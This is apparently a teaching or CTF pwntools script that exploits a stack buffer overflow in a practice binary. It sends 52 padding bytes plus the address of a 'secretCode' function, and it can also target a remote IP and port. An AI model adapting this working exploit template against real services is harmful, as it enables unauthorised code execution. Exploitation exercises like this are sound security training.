#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap


# you can run this script in the following ways:
# run locally without debugger: 
#      ./pwntoolsTest_poc.py
# run in GDB:
#      ./pwntoolsTest_poc.py GDB
# run against a remote target: 
#     ./pwntoolsTest_poc.py REMOTE $IP $PORT

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw)

binPath="./pwntoolsTest"
isRemote = pwn.args.REMOTE

# build in GDB support
# this is where we can automate our breakpoints
gdbscript = '''
init-pwndbg
break *getCar+37
continue
'''.format(**locals())

# configure pwntools logging: info, debug you will use the most
pwn.context.log_level="debug"

# create the program object to interact with 
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# use pwntools to automate fetching of symbol addresses
secretCodeAddr = elf.symbols['secretCode']
pwn.info("secretCode Address is: %x", secretCodeAddr)

# start the binary & interact with the program to get to where we can exploit
io = start()

# remember to send & receive bytes objects b"example"
io.recvuntil(b"3. Rent a scooter.")
io.sendline(b"1")
ioCapture = io.recvuntil(b"What would you like to buy?")

# print to the screen using pwntools; can assign a debugging level
pwn.info("Received string: %s",ioCapture)

# define Payload; use pack32 to pack address in little endian
overFlow = 52*b"A"
secretCode = pwn.p32(secretCodeAddr)
secretCodeFixed = pwn.p32(0x080491cc)

buffer = pwn.flat(
        [
            overFlow,
            secretCode
            ]
        )
io.sendline(buffer)

# go "interactive" with the program
# this will let you send arbitrary input via keyboard
# and/or interact with your shell
io.interactive()
